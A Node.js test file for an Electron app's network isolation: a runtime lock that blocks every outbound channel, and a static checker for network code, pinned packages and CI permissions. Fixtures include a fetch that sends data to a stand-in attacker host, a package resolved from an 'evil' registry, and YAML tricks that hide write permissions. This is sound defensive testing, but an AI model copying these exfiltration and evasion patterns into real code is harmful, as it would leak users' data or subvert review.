// Wilfred's isolation: the runtime network lock, and the check that keeps network code out.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const net = require('node:net');
const { lockNetwork, verifyNetworkLocked, isLocalPipe, NetworkBlockedError, lockChromiumSwitches, lockSession, ALLOWED_EXTERNAL, LOCAL_URL } = require('../src/no-network');
const C = require('../tools/check-isolation');
const { SessionSource } = require('../src/sessions/source');

const ROOT = path.join(__dirname, '..');

// ---- the runtime lock ----

test('locked, every way out of the process is refused', () => {
  const scope = { fetch: () => 'real fetch', WebSocket: function WebSocket() {}, EventSource: function EventSource() {} };
  const unlock = lockNetwork(scope);
  try {
    const result = verifyNetworkLocked(scope);
    assert.deepEqual(result.open, []);
    assert.deepEqual(result.blocked.sort(), ['dns', 'fetch', 'http', 'http2', 'https', 'listen', 'tcp', 'tls', 'udp']);
    assert.throws(() => new scope.WebSocket('wss://x'), NetworkBlockedError);
    assert.throws(() => new scope.EventSource('https://x'), NetworkBlockedError);
    assert.throws(() => require('node:dns').promises.lookup('example.invalid'), NetworkBlockedError);
    assert.throws(() => new (require('node:dns').Resolver)(), NetworkBlockedError);
    assert.throws(() => net.connect(443, '192.0.2.1'), /no network access \(blocked: TCP connection\)/);
  } finally {
    unlock();
  }
  assert.equal(scope.fetch(), 'real fetch', 'unlock restores everything');
});

test('locked, local pipes (how Electron and Node talk to themselves) still work', async () => {
  const unlock = lockNetwork({});
  const pipe = process.platform === 'win32' ? `\\\\.\\pipe\\wilfred-test-${process.pid}` : path.join(os.tmpdir(), `wilfred-test-${process.pid}.sock`);
  try {
    const server = net.createServer((s) => s.end('hi'));
    await new Promise((r) => server.listen(pipe, r));
    const reply = await new Promise((resolve, reject) => {
      const c = net.connect({ path: pipe });
      let data = '';
      c.on('data', (d) => { data += d; });
      c.on('end', () => resolve(data));
      c.on('error', reject);
    });
    assert.equal(reply, 'hi');
    await new Promise((r) => server.close(r));
  } finally {
    unlock();
    if (process.platform !== 'win32') fs.rmSync(pipe, { force: true });
  }
});

test('a property that cannot be assigned is still replaced', () => {
  const scope = {};
  Object.defineProperty(scope, 'fetch', { value: () => 'real', writable: false, configurable: true });
  const unlock = lockNetwork(scope);
  assert.throws(() => scope.fetch('https://x'), NetworkBlockedError);
  unlock();
  assert.equal(scope.fetch(), 'real');
});

test('the self-test reports anything that gets through, and cleans up after it', () => {
  const cleaned = [];
  const result = verifyNetworkLocked({}, {
    socket: () => ({ destroy: () => cleaned.push('destroy') }),
    server: () => ({ close: () => cleaned.push('close') }),
    promise: () => ({ catch: (onError) => { onError(new Error('x')); cleaned.push('catch'); } }),
    nothing: () => undefined,
    otherError: () => { throw new Error('ECONNREFUSED'); },
    refused: () => { throw new NetworkBlockedError('x'); },
  });
  assert.deepEqual(result.open, ['socket', 'server', 'promise', 'nothing', 'otherError']);
  assert.deepEqual(result.blocked, ['refused']);
  assert.deepEqual(cleaned, ['destroy', 'close', 'catch']);
});

test('isLocalPipe tells pipes from hosts', () => {
  assert.equal(isLocalPipe(['\\\\.\\pipe\\x']), true);
  assert.equal(isLocalPipe(['/tmp/x.sock']), true);
  assert.equal(isLocalPipe([{ path: '/tmp/x.sock' }]), true);
  assert.equal(isLocalPipe([[{ path: '/tmp/x.sock' }]]), true);
  assert.equal(isLocalPipe([443, 'example.com']), false);
  assert.equal(isLocalPipe(['443']), false);
  assert.equal(isLocalPipe([{ port: 443, host: 'x' }]), false);
  assert.equal(isLocalPipe([{ path: '/x', port: 1 }]), false);
  assert.equal(isLocalPipe([{ path: '/x', host: 'x' }]), false);
  assert.equal(isLocalPipe([null]), false);
});

test('the Chromium lock: switches, cancelled requests, no permissions, claude:// only', () => {
  const switches = [];
  lockChromiumSwitches({ commandLine: { appendSwitch: (k, v) => switches.push(v === undefined ? k : `${k}=${v}`) } });
  assert.ok(switches.includes('host-resolver-rules=MAP * ~NOTFOUND'));
  assert.ok(switches.includes('proxy-server=127.0.0.1:9'));
  let onRequest;
  let onPermission;
  let onCheck;
  lockSession({
    webRequest: { onBeforeRequest: (fn) => { onRequest = fn; } },
    setPermissionRequestHandler: (fn) => { onPermission = fn; },
    setPermissionCheckHandler: (fn) => { onCheck = fn; },
  });
  const decide = (url) => { let r; onRequest({ url }, (x) => { r = x; }); return r.cancel; };
  assert.equal(decide('https://example.com/'), true);
  assert.equal(decide('wss://example.com/'), true);
  assert.equal(decide('file:///C:/wilfred/src/renderer/index.html'), false);
  assert.equal(decide('data:text/html,x'), false);
  let granted;
  onPermission(null, 'media', (g) => { granted = g; });
  assert.equal(granted, false);
  assert.equal(onCheck(), false);
  assert.ok(ALLOWED_EXTERNAL.test('claude://code/continue?session=local_x'));
  assert.ok(!ALLOWED_EXTERNAL.test('https://claude.ai'));
  // The project page, opened from About on a click, and nothing that merely starts like it.
  for (const ok of ['https://github.com/ArduusLabs/wilfred', 'https://github.com/ArduusLabs/wilfred#readme', 'https://github.com/ArduusLabs/wilfred/issues']) assert.ok(ALLOWED_EXTERNAL.test(ok), ok);
  for (const bad of ['https://github.com/ArduusLabs/wilfred-evil', 'https://github.com/ArduusLabs/wilfredx', 'http://github.com/ArduusLabs/wilfred', 'https://example.com/', 'https://github.com.evil.example/ArduusLabs/wilfred']) {
    assert.ok(!ALLOWED_EXTERNAL.test(bad), bad);
  }
  assert.ok(LOCAL_URL.test('blob:x') && !LOCAL_URL.test('http://x'));
});

test('Wilfred reads your sessions with the network locked: it never needs it', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wilfred-iso-'));
  const sessions = path.join(dir, 's');
  const proj = path.join(dir, 'p', 'C--repo');
  fs.mkdirSync(sessions, { recursive: true });
  fs.mkdirSync(proj, { recursive: true });
  const cli = '0a1b2c3d-4444-4555-8666-977788889999';
  fs.writeFileSync(path.join(sessions, 'local_a.json'), JSON.stringify({ sessionId: 'local_a', cliSessionId: cli, title: 'A', lastActivityAt: Date.now() }));
  fs.writeFileSync(path.join(proj, `${cli}.jsonl`), JSON.stringify({ type: 'user', timestamp: new Date().toISOString(), message: { content: 'go' } }) + '\n');
  const unlock = lockNetwork({});
  try {
    const rows = new SessionSource({ sessionDirs: [sessions], projectsDir: path.join(dir, 'p'), windowMs: 3600e3, onRows: () => {} }).read();
    assert.equal(rows[0].title, 'A');
    assert.equal(rows[0].state, 'working');
  } finally {
    unlock();
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// ---- the isolation check ----

test('the repository passes its own isolation check', () => {
  assert.deepEqual(C.checkRepo(ROOT), []);
});

test('the check catches network code sneaked into a source file', () => {
  const bad = (file, code) => C.checkSource(file, code);
  assert.match(bad('src/main.js', "require('./no-network'); lockNetwork();\nconst https = require('node:https');").join(), /may not load "node:https"/);
  assert.match(bad('src/window-logic.js', "const h = require('http');").join(), /may not load "http"/);
  assert.match(bad('src/window-logic.js', 'const m = require(name);').join(), /non-literal/);
  assert.match(bad('src/window-logic.js', "import x from 'node:net';").join(), /may not import "node:net"/);
  assert.match(bad('src/main.js', "const { app, net } = require('electron');").join(), /Electron's "net"/);
  assert.match(bad('src/sessions/source.js', "fetch('https://evil.example.net/' + data);").join(), /fetch\(\) is not allowed/);
  assert.match(bad('src/sessions/source.js', "const u = 'https://evil.example.net/collect';").join(), /URL to an outside host: https:\/\/evil\.example\.net\/collect/);
  assert.match(bad('src/renderer/renderer.js', 'new WebSocket(u);').join(), /WebSocket/);
  assert.match(bad('src/renderer/renderer.js', 'navigator.sendBeacon(u, d);').join(), /sendBeacon/);
  assert.match(bad('src/renderer/renderer.js', 'const x = new XMLHttpRequest();').join(), /XMLHttpRequest/);
  assert.match(bad('src/renderer/view.js', 'eval(s);').join(), /eval/);
  assert.match(bad('src/renderer/view.js', 'await import(u);').join(), /dynamic import/);
  assert.match(bad('src/main.js', 'win.loadURL(u);').join(), /loadURL/);
  assert.match(bad('src/window-logic.js', 'shell.openExternal(u);').join(), /openExternal/);
  assert.match(bad('src/main.js', 'webPreferences: { nodeIntegration: true }').join(), /nodeIntegration/);
  assert.match(bad('src/main.js', 'webPreferences: { sandbox: false }').join(), /sandbox: false/);
  assert.match(bad('src/new-file.js', '').join(), /not on the isolation allowlist/);
  // Prose and namespace identifiers are fine; the URL rule is about where code could send data.
  assert.deepEqual(bad('src/window-logic.js', "// we never call fetch() here\n/* nor eval() */\nconst ns = 'http://www.w3.org/2000/svg';"), []);
  // The verifier may probe public hosts; nothing else may name them.
  assert.deepEqual(bad('tools/verify-offline.js', "const t = 'https://example.com/'; fetch(t);"), []);
  assert.match(bad('src/main.js', "const t = 'https://example.com/';").join(), /outside host/);
  // The project page may be named; a look-alike may not.
  assert.deepEqual(bad('src/main.js', "// see https://github.com/ArduusLabs/wilfred#readme\nconst p = 'https://github.com/ArduusLabs/wilfred';"), []);
  assert.match(bad('src/main.js', "const t = 'https://github.com/ArduusLabs/wilfred-evil';").join(), /outside host/);
  // The checker's own pattern list isn't flagged, but its imports still are.
  assert.deepEqual(bad('tools/check-isolation.js', "const re = /fetch\\s*\\(/; require(x);"), []);
  assert.match(bad('tools/check-isolation.js', "require('node:https');").join(), /may not load "node:https"/);
});

test('the check requires main.js to lock the network before anything else', () => {
  assert.deepEqual(C.checkLockFirst("// start\nconst { lockNetwork } = require('./no-network');\nlockNetwork();\nconst e = require('electron');"), []);
  assert.match(C.checkLockFirst("const e = require('electron');\nconst { lockNetwork } = require('./no-network');\nlockNetwork();").join(), /before lockNetwork/);
  assert.match(C.checkLockFirst("const e = require('electron');").join(), /never calls lockNetwork/);
});

test('the check keeps the page locked down', () => {
  const page = (csp, body = '') => `<meta http-equiv="Content-Security-Policy" content="${csp}">${body}`;
  assert.deepEqual(C.checkHtml('x.html', page(C.EXPECTED_CSP, '<script src="renderer.js"></script><img src="data:image/png;base64,x">')), []);
  assert.match(C.checkHtml('x.html', page("default-src 'none'; connect-src *")).join(), /policy changed/);
  assert.match(C.checkHtml('x.html', '<title>no csp</title>').join(), /policy is missing/);
  assert.match(C.checkHtml('x.html', page(C.EXPECTED_CSP, '<script src="https://cdn.example/x.js"></script>')).join(), /loads from outside/);
});

test('the check allows only reviewed packages, exactly pinned, from the npm registry', () => {
  const pkg = { devDependencies: { electron: '44.9.3' }, scripts: { test: 'node --test' } };
  const lock = { packages: { '': {}, 'node_modules/electron': { version: '44.9.3', resolved: 'https://registry.npmjs.org/electron/-/electron-44.9.3.tgz', integrity: 'sha512-x' } } };
  assert.deepEqual(C.checkPackages(pkg, lock, ['electron@44.9.3']), []);
  assert.match(C.checkPackages({ ...pkg, dependencies: { axios: '1.0.0' } }, lock, ['electron@44.9.3']).join(), /runtime dependencies/);
  assert.match(C.checkPackages({ ...pkg, devDependencies: { electron: '44.9.3', leftpad: '1.0.0' } }, lock, ['electron@44.9.3']).join(), /devDependency "leftpad"/);
  assert.match(C.checkPackages({ ...pkg, devDependencies: { electron: '^44.9.3' } }, lock, ['electron@44.9.3']).join(), /exact version/);
  assert.match(C.checkPackages({ ...pkg, scripts: { postinstall: 'node x.js' } }, lock, ['electron@44.9.3']).join(), /"postinstall" script/);
  const sneaky = { packages: { ...lock.packages, 'node_modules/telemetry': { version: '1.0.0', resolved: 'https://evil.example/t.tgz' } } };
  const problems = C.checkPackages(pkg, sneaky, ['electron@44.9.3']).join('\n');
  assert.match(problems, /telemetry comes from https:\/\/evil\.example/);
  assert.match(problems, /telemetry has no integrity hash/);
  assert.match(problems, /telemetry@1.0.0 is not in security\/allowed-packages.json/);
  assert.match(C.checkPackages(pkg, lock, ['electron@44.9.3', 'gone@1.0.0']).join(), /gone@1.0.0 is no longer in the lockfile/);
  assert.deepEqual(C.checkPackages({}, { packages: { '': {} } }, []), []);
  assert.deepEqual(C.checkPackages({}, {}, []), []);
});

test('the check keeps CI read-only and its actions pinned', () => {
  const ok = 'permissions:\n  contents: read\njobs:\n  t:\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n';
  assert.deepEqual(C.checkWorkflow('w.yml', ok), []);
  assert.match(C.checkWorkflow('w.yml', ok.replace('permissions:\n  contents: read\n', '')).join(), /contents: read/);
  assert.match(C.checkWorkflow('w.yml', `${ok}    permissions:\n      pull-requests: write\n`).join(), /write permission/);
  assert.match(C.checkWorkflow('w.yml', ok.replace(/@[0-9a-f]{40}/, '@v7')).join(), /full commit hash, not "v7"/);
});

test('only the release workflow\'s "release" job may write, and only the repository\'s contents', () => {
  const pin = 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1';
  const wf = (jobPerms, top = '  contents: read\n') =>
    `name: Release\non:\n  push:\npermissions:\n${top}jobs:\n  build:\n    runs-on: x\n    steps:\n      - uses: ${pin}\n      - run: rm -rf a && node b.js\n  release:   # publishes\n    needs: build\n    permissions:   # its own\n${jobPerms}    steps:\n      - uses: ${pin}\n      - run: |\n          echo "not a key, to write" \\\n            && echo '* & ! { ['\n`;
  const allowed = wf('      contents: write   # the tag and the release\n      actions: read\n');
  const R = C.RELEASE_WORKFLOW;
  const T = '.github/workflows/test.yml';
  assert.equal(R, '.github/workflows/release.yml');
  assert.deepEqual(C.checkWorkflow(R, allowed), []);
  assert.deepEqual(C.checkWorkflow(R, allowed.replace(/\n/g, '\r\n')), []);
  assert.deepEqual(C.checkWorkflow(R, wf('      contents: read\n      id-token: none\n')), []);
  assert.deepEqual(C.checkWorkflow(T, wf('      contents: read\n')), []);
  // The same write in any other workflow is refused.
  assert.match(C.checkWorkflow(T, allowed).join(), /test\.yml:15: grants write permission$/);
  // In the release workflow: any other scope, another job, the workflow's own block.
  assert.match(C.checkWorkflow(R, wf('      packages: write\n')).join(), /release\.yml:15: grants write permission \(only the "release" job's own "contents: write" may\)/);
  assert.match(C.checkWorkflow(R, wf('      id-token: write\n')).join(), /grants write permission/);
  assert.match(C.checkWorkflow(R, wf('      actions: write\n')).join(), /grants write permission/);
  const buildWrites = allowed.replace('    runs-on: x\n', '    runs-on: x\n    permissions:\n      contents: write\n');
  assert.match(C.checkWorkflow(R, buildWrites).join(), /release\.yml:10: grants write permission/);
  assert.match(C.checkWorkflow(R, wf('      contents: read\n', '  contents: read\n  packages: write\n')).join(), /release\.yml:6: grants write permission/);
  assert.match(C.checkWorkflow(R, wf('      contents: read\n', '  contents: write\n')).join(), /must declare "permissions: contents: read"/);

  // Every other way of writing a permission is refused, whatever it says: these all mean a write to
  // YAML (or could), and the check only accepts the plain form it can read.
  const job = (block) => allowed.replace('    permissions:   # its own\n      contents: write   # the tag and the release\n      actions: read\n', block);
  const refused = {
    'value on the next line': job('    permissions:\n      contents:\n        write\n'),
    'comment before the value': job('    permissions:\n      id-token:\n        # why\n        write\n'),
    'double-quoted': job('    permissions:\n      contents: "write"\n'),
    'single-quoted': job("    permissions:\n      contents: 'write'\n"),
    'escaped x': job('    permissions:\n      id-token: "\\x77rite"\n'),
    'escaped u': job('    permissions:\n      id-token: "\\u0077rite"\n'),
    'line continuation': job('    permissions:\n      id-token: "wr\\\n        ite"\n'),
    folded: job('    permissions:\n      packages: >-\n        write\n'),
    literal: job('    permissions:\n      packages: |\n        write\n'),
    tag: job('    permissions:\n      id-token: !!str write\n'),
    'anchor and alias': job('    env:\n      X: &w write\n    permissions:\n      id-token: *w\n'),
    'alias for the block': job('    permissions: *p\n'),
    'write-all': job('    permissions: write-all\n'),
    'write-all on the next line': job('    permissions:\n      write-all\n'),
    'inline mapping': job('    permissions: { contents: write }\n'),
    'flow over lines': job('    permissions: {\n      contents: write }\n'),
    'deeper indent': job('    permissions:\n        contents: write\n'),
    'under a step': `${allowed}      - run: x\n        permissions:\n          contents: write\n`,
    'complex key': job('    permissions:\n      ? contents\n      : write\n'),
    'quoted key': job('    permissions:\n      "contents": write\n'),
    'quoted job name': allowed.replace('  build:\n', '  "build":\n    permissions:\n      contents: write\n'),
    'job name with a space': allowed.replace('  build:\n', '  build :\n    permissions:\n      contents: write\n'),
    'jobs indented four': allowed.replace(/\n {2}(build|release):/g, '\n    $1:'),
    'top level: next line': wf('      contents: read\n', '  contents: read\n  packages:\n    write\n'),
    'a write under another key': `${allowed}    env:\n      contents: write\n`,
    'a write after the jobs': `${allowed}env:\n  x: write\n`,
  };
  for (const [what, text] of Object.entries(refused)) {
    for (const file of [R, T]) assert.notDeepEqual(C.checkWorkflow(file, text), [], `${what} in ${file}`);
  }
  assert.match(C.checkWorkflow(R, refused['escaped x']).join(), /can't read: a backslash/);
  assert.match(C.checkWorkflow(R, refused['anchor and alias']).join(), /can't read: an anchor, alias or tag/);
  assert.match(C.checkWorkflow(R, refused['complex key']).join(), /can't read: a complex key/);
  assert.match(C.checkWorkflow(R, refused['quoted job name']).join(), /can't read: a quoted key.*a job must be a plain name/);
  assert.match(C.checkWorkflow(R, refused['flow over lines']).join(), /can't read: a flow collection over several lines/);
  assert.match(C.checkWorkflow(R, refused['value on the next line']).join(), /a permission must be a plain "scope: read" line/);
  assert.match(C.checkWorkflow(R, refused['inline mapping']).join(), /permissions must be a block at the top or in a job/);
  // A write spelled out where no permission is (a script's text) is still refused, as it always was.
  assert.match(C.checkWorkflow(T, wf('      contents: read\n').replace('rm -rf a', 'echo x: write')).join(), /grants write permission/);
  // And the release workflow's actions are still pinned.
  assert.match(C.checkWorkflow(R, allowed.replace(/@[0-9a-f]{40}/, '@v7')).join(), /full commit hash, not "v7"/);
});

test('the repository\'s release workflow passes, and grants write in one job only', () => {
  const text = fs.readFileSync(path.join(ROOT, C.RELEASE_WORKFLOW), 'utf8').replace(/\r\n/g, '\n');
  assert.deepEqual(C.checkWorkflow(C.RELEASE_WORKFLOW, text), []);
  assert.equal(text.match(/:\s*write\b/g).length, 1);
  assert.match(text, /^ {2}release:\n(?: {4}.*\n|\s*#.*\n)*? {4}permissions:\n {6}contents: write\n {6}actions: read\n/m);
  assert.doesNotMatch(text, /secrets\./);
});
